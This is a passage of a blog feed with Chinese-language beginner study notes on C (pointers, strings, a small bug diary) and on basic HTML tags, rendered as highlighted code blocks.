class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">interchange</span><span class="params">(<span class="type">int</span>* u, <span class="type">int</span>* v)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Originally x = %d and y = %d.\n&quot;</span>, x, y);</span><br><span class="line">    interchange(&amp;x, &amp;y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now x = %d and y = %d.\n&quot;</span>, x, y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">interchange</span><span class="params">(<span class="type">int</span>* u, <span class="type">int</span>* v)</span> &#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    temp = *u;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">u的值是&amp;x，所以u指向x。这意味着用*u即可表示x的值，这正是我们需要的。不要写成这样：</span></span><br><span class="line"><span class="comment">temp = u;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    *u = *v;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    这条语句相当于：</span></span><br><span class="line"><span class="comment">x = y;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    *v = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-数组"><a href="#2-数组" class="headerlink" title="2.数组"></a>2.数组</h3><p>​对于数组别无选择，必须传递指针，因为这样做效率高。如果一个函数按值传递数组，则必须分配足够的空间来储存原数组的副本，然后把原数组所有的数据拷贝至新的数组中。如果把数组的地址传递给函数，让函数直接处理原数组则效率要高。</p><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a><strong>字符串</strong></h1><h2 id="定义字符串"><a href="#定义字符串" class="headerlink" title="定义字符串"></a>定义字符串</h2><p>​用双引号括起来的内容称为字符串字面量（string literal），也叫作字符串常量（string constant）。双引号中的字符和编译器自动加入末尾的<code>\0</code>字符， 都作为字符串储存在内存中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> m1[<span class="number">40</span>] = <span class="string">&quot;Limit yourself to one line&#x27;s worth.&quot;</span></span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> m1[<span class="number">40</span>] = &#123; <span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\&quot;, &#x27;</span>s<span class="number">&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br></pre></td></tr></table></figure><h3 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h3><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NAME <span class="string">&quot;HeyJWEI&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="char类型数组"><a href="#char类型数组" class="headerlink" title="char类型数组"></a><code>char</code>类型数组</h3><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> name[] = <span class="string">&quot;HEYJW&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="指向char的指针"><a href="#指向char的指针" class="headerlink" title="指向char的指针"></a>指向char的指针</h3><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> * pi = <span class="string">&quot;HeyJWEI&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：如果要在字符串内部使用双引号，必须在双引号前面加上一个反斜杠（\）</p><p><strong>字符串串联规则</strong>：从ANSI C标准起，如果字符串字面量之间没有间隔，或者用空白字符分隔（包括换行），C会将其视为串联起来的字符串字面量。</p><h3 id="数组形式和指针形式的区别"><a href="#数组形式和指针形式的区别" class="headerlink" title="数组形式和指针形式的区别"></a>数组形式和指针形式的区别</h3><p><strong>数组</strong></p><p>​数组形式在计算机的内存中分配为一个内含 字母数+1 个元素的数组（每个元素对应一个字符，还加上一个末尾的空字符’\0’），每个元素被初始化为字符串字面量对应的字符。通常，字符串都作为可执行文件的一部分储存在数据段中。当把程序载入内存时，也载入了程序中的字符串。字符串储存在<strong>静态存储区</strong>（static memory）中。但是，程序在开始运行时才会为该数组分配内存。此时，才将<strong>字符串拷贝到数组中</strong>。注意，此时字符串有两个副本。一个是在静态内存中的字符串字面量，另一个是储存在数组中的字符串。</p><p><strong>即以下流程</strong></p><ol><li><p>字符串的内存分配</p></li><li><p>字符串的初始化</p></li><li><p>字符串的存储位置</p></li><li><p>字符串的拷贝</p><p>注：此时编译器便把<strong>数组名识别为该数组首元素地址</strong>（<code>&amp;数组名[0]</code>）的别名。这里关键要理解，在数组形式中，<strong>数组名</strong>是地址常<br>量。<strong>不能更改ar1，如果改变了ar1，则意味着改变了数组的存储位置（即地址）</strong>。可以<strong>进行类似 数组名+1</strong>这样的操作，标识数组的下一个元素。但是<strong>不允许进行++数组名</strong>这样的操作。</p></li></ol><h4 id="指针-1"><a href="#指针-1" class="headerlink" title="指针"></a><strong>指针</strong></h4><p>指针形式（<code>*pt1</code>）也使得编译器为字符串在静态存储区预留元素的空间。另外，一旦开始执行程序，它会为指针变量<code>pt1</code>留出一个储存位置，并把字符串的地址储存在指针变量中。</p><p>注：</p><p>​该变量最初指向该字符串的首字符，但是它的值可以改变。<strong>因此，可以使用递增运算符。</strong>例如，++pt1将指向第 2 个字符</p><p>​用双引号括起来的内容被视为指向该字符串储存位置的指针(类似于字符数组的指针，只指向第一个字母)。这类似于把数组名作为指向该数组位置的指针。</p><h4 id="注："><a href="#注：" class="headerlink" title="注："></a><strong>注：</strong></h4><p>字符串字面量被视为const数据。由于pt1指向这个const数据，所以应该把pt1声明为指向const数据的指针。这意味着不能用pt1改变它所指向的数据，但是仍然可以改变pt1的值（即，pt1指向的位置）。如果把一个字符串字面量拷贝给一个数组，就可以随意改变数据，除非把数组声明为const。</p><p><code>puts()</code>函数</p><p>和<code>printf()</code>函数一样，<code>puts()</code>函数也属于<code>stdio.h</code>系列的输入&#x2F;输出函数。但是，与<code>printf()</code>不同的是，<code>puts()</code>函数只显示字符串，而且自动在显示的字符串末尾加上换行符</p><h1 id="一些神奇的语句"><a href="#一些神奇的语句" class="headerlink" title="一些神奇的语句"></a><strong>一些神奇的语句</strong></h1><p>学习过程中碰到了一些我觉得很神奇的语句</p><p>1.逻辑运算符在赋值中的直接使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="number">10</span>==<span class="number">2</span>);<span class="comment">//此时a = 0</span></span><br></pre></td></tr></table></figure><p>2.在<code>while()</code>中嵌入<code>scanf()</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a));<span class="comment">//此时程序先运行scanf()函数后将函数的返回值输入给while，若为整数则返回1，若为非整数则返回0</span></span><br></pre></td></tr></table></figure><p>3.在<code>while()</code>中的括号中填入数字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);<span class="comment">//若括号中的数值不为0，即可执行while循环</span></span><br></pre></td></tr></table></figure><p>4.可利用<code>scanf()</code>的返回值对变量进行赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;c)</span><br></pre></td></tr></table></figure><p>5.获取字符同时进行判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>等同于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (</span><br><span class="line">(ch = getchar()) <span class="comment">// 给ch赋一个值</span></span><br><span class="line">!= <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// 把ch和\n作比较</span></span><br></pre></td></tr></table></figure><p>但区别于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (ch = getchar() != <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​!&#x3D;运算符的优先级比&#x3D;高，所以先对表达式getchar() !&#x3D; ‘\n’求值。由于这是关系表达式，所以其值不是1就是0（真或假）。然后，把该值赋给ch。</p><p>6.由于C保证在给数组分配空间时，指向数组后面第一个位置的指针仍是有效的指针。可写出一些简洁的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sum_arr2.c -- 数组元素之和 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 10</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sump</span><span class="params">(<span class="type">int</span> * start, <span class="type">int</span> * end)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> marbles[SIZE] = &#123; <span class="number">20</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">39</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">16</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">20</span> &#125;; <span class="type">long</span> answer;</span><br><span class="line">answer = sump(marbles, marbles + SIZE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The total number of marbles is</span></span><br><span class="line"><span class="string">%ld.\n&quot;</span>, answer);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 使用指针算法 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sump</span><span class="params">(<span class="type">int</span> * start, <span class="type">int</span> * end)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> total = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (start &lt; end)</span><br><span class="line">&#123;</span><br><span class="line">total += *start; <span class="comment">// 把数组元素的值加起来</span></span><br><span class="line">start++; <span class="comment">// 让指针指向下一个元素</span></span><br><span class="line">&#125; <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，使用这种“越界”指针（超出数组有含义的内存地址）的函数调用更为简洁</p><p>7.多维数组的解引用与加法操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（*(*(zippo+<span class="number">2</span>) + <span class="number">1</span>)）</span><br><span class="line"> <span class="comment">//代替数组表示法（zippo[2][1]）</span></span><br></pre></td></tr></table></figure><h1 id="Bug日记"><a href="#Bug日记" class="headerlink" title="Bug日记"></a><strong>Bug日记</strong></h1><p><strong>1.for循环局部变量错误</strong></p><p>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MONTHS 12    <span class="comment">// number of months in a year</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YEARS   5    <span class="comment">// number of years of data</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="comment">// initializing rainfall data for 2010 - 2014</span></span><br><span class="line"><span class="type">float</span> rain[YEARS][MONTHS] = &#123;</span><br><span class="line">&#123;<span class="number">4.3</span>, <span class="number">4.3</span>, <span class="number">4.3</span>, <span class="number">3.0</span>, <span class="number">2.0</span>, <span class="number">1.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.4</span>, <span class="number">2.4</span>, <span class="number">3.5</span>, <span class="number">6.6</span>&#125;,</span><br><span class="line">&#123;<span class="number">8.5</span>, <span class="number">8.2</span>, <span class="number">1.2</span>, <span class="number">1.6</span>, <span class="number">2.4</span>, <span class="number">0.0</span>, <span class="number">5.2</span>, <span class="number">0.9</span>, <span class="number">0.3</span>, <span class="number">0.9</span>, <span class="number">1.4</span>, <span class="number">7.3</span>&#125;,</span><br><span class="line">&#123;<span class="number">9.1</span>, <span class="number">8.5</span>, <span class="number">6.7</span>, <span class="number">4.3</span>, <span class="number">2.1</span>, <span class="number">0.8</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">1.1</span>, <span class="number">2.3</span>, <span class="number">6.1</span>, <span class="number">8.4</span>&#125;,</span><br><span class="line">&#123;<span class="number">7.2</span>, <span class="number">9.9</span>, <span class="number">8.4</span>, <span class="number">3.3</span>, <span class="number">1.2</span>, <span class="number">0.8</span>, <span class="number">0.4</span>, <span class="number">0.0</span>, <span class="number">0.6</span>, <span class="number">1.7</span>, <span class="number">4.3</span>, <span class="number">6.2</span>&#125;,</span><br><span class="line">&#123;<span class="number">7.6</span>, <span class="number">5.6</span>, <span class="number">3.8</span>, <span class="number">2.8</span>, <span class="number">3.8</span>, <span class="number">0.2</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.3</span>, <span class="number">2.6</span>, <span class="number">5.2</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> year, month;</span><br><span class="line"><span class="type">float</span> subtot = <span class="number">1</span>, total;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; YEAR    RAINFALL  (inches)\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (year = <span class="number">0</span>, total = <span class="number">0</span>; year &lt; YEARS; year++) &#123;</span><br><span class="line"><span class="comment">// for each year, sum rainfall for each month</span></span><br><span class="line">subtot = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">float</span> *zhizheng = rain[year], subtot = <span class="number">0</span>; zhizheng &lt; &amp;rain[year][MONTHS] ; zhizheng++)<span class="comment">//错误地方</span></span><br><span class="line">subtot +=  *zhizheng;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d %15.1f\n&quot;</span>, <span class="number">2010</span> + year, subtot);</span><br><span class="line">total += subtot; <span class="comment">// total for all years</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在错误的for循环处，subtot被重新定义，变成for循环的局部变量</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C语言概述&quot;&gt;&lt;a href=&quot;#C语言概述&quot; class=&quot;headerlink&quot; title=&quot;C语言概述&quot;&gt;&lt;/a&gt;&lt;strong&gt;C语言概述&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;C程序的基本结构&quot;&gt;&lt;a href=&quot;#C程序的基本结构&quot; class=</summary>
      
    
    
    
    <category term="编程" scheme="https://we11s.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="开发" scheme="https://we11s.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>HTML笔记</title>
    <link href="https://we11s.github.io/posts/2607722179/"/>
    <id>https://we11s.github.io/posts/2607722179/</id>
    <published>2023-09-23T07:37:47.000Z</published>
    <updated>2024-01-29T13:35:36.834Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h2><p>HTML（<strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage）是用来描述网页的一种语言。</p><h2 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h2><ul><li>HTML 标签是由<strong>尖括号</strong>包围的关键词，比如 <code>&lt;html&gt;</code></li><li>HTML 标签通常是<strong>成对出现</strong>的，比如 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code></li><li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li></ul><p><strong>注：”HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思。</strong></p><h2 id="HTML声明"><a href="#HTML声明" class="headerlink" title="HTML声明"></a>HTML声明</h2><p><code>&lt;!DOCTYPE&gt;</code>声明有助于浏览器中正确显示网页。doctype 声明是<strong>不区分大小写</strong>的</p><p><strong>HTML实例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>   <span class="comment">&lt;!-- 声明为HTML5文档 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- HTML页面开始 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 头部元素开始 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 头部元素结束 --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 可见的页面内容开始 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 可见的页面内容结束 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- HTML页面结束 --&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HTML基础构成"><a href="#HTML基础构成" class="headerlink" title="HTML基础构成"></a>HTML基础构成</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是标题 1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是标题 2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是标题 3<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>这是标题 4<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>这是标题 5<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>这是标题 6<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><p>HTML 段落是通过标签 <code>&lt;p&gt;</code> 来定义的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h3><p><code>&lt;hr&gt;</code> 标签在 HTML 页面中创建水平线,可用于分隔内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>语法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这是一个注释 --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="折行-换行"><a href="#折行-换行" class="headerlink" title="折行&#x2F;换行"></a>折行&#x2F;换行</h3><p>在不产生一个新段落的情况下进行换行（新行），请使用 <code>&lt;br&gt;</code> 标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这个<span class="tag">&lt;<span class="name">br</span>&gt;</span>段落<span class="tag">&lt;<span class="name">br</span>&gt;</span>演示了分行的效果<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：<code>&lt;br&gt;</code> 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此<strong>它没有结束标签</strong>。</p><h3 id="空格的使用"><a href="#空格的使用" class="headerlink" title="空格的使用"></a>空格的使用</h3><p>对于 HTML，无法通过在 HTML 代码中<strong>添加额外的空格或换行来改变输出的效果</strong>。</p><p>当显示页面时，浏览器会<strong>移除源代码中多余的空格和空行</strong>。<strong>所有连续的空格或空行都会被算作一个空格</strong>。需要注意的是，HTML 代码中的<strong>所有连续的空行（换行）也被显示为一个空格</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;</span><br><span class="line">    春眠不觉晓，</span><br><span class="line">      处处闻啼鸟。</span><br><span class="line">        夜来风雨声，</span><br><span class="line">          花落知多少。</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;注意，浏览器忽略了源代码中的排版（省略了多余的空格和换行）。&lt;/p&gt;</span><br></pre></td></tr></table></figure><h2 id="HTML文本格式化标签"><a href="#HTML文本格式化标签" class="headerlink" title="HTML文本格式化标签"></a>HTML文本格式化标签</h2><h3 id="文本加粗"><a href="#文本加粗" class="headerlink" title="文本加粗"></a>文本加粗</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;这个文本是加粗的&lt;/b&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;strong&gt;这个文本是加粗的&lt;/strong&gt;</span><br></pre></td></tr></table></figure><h3 id="文字放大与缩小"><a href="#文字放大与缩小" class="headerlink" title="文字放大与缩小"></a>文字放大与缩小</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;big&gt;这个文本字体放大&lt;/big&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;small&gt;这个文本是缩小的&lt;/small&gt;</span><br></pre></td></tr></table></figure><h3 id="文字斜体"><a href="#文字斜体" class="headerlink" title="文字斜体"></a>文字斜体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;em&gt;这个文本是斜体的&lt;/em&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;这个文本是斜体的&lt;/i&gt;</span><br></pre></td></tr></table></figure><h3 id="上下标"><a href="#上下标" class="headerlink" title="上下标"></a>上下标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 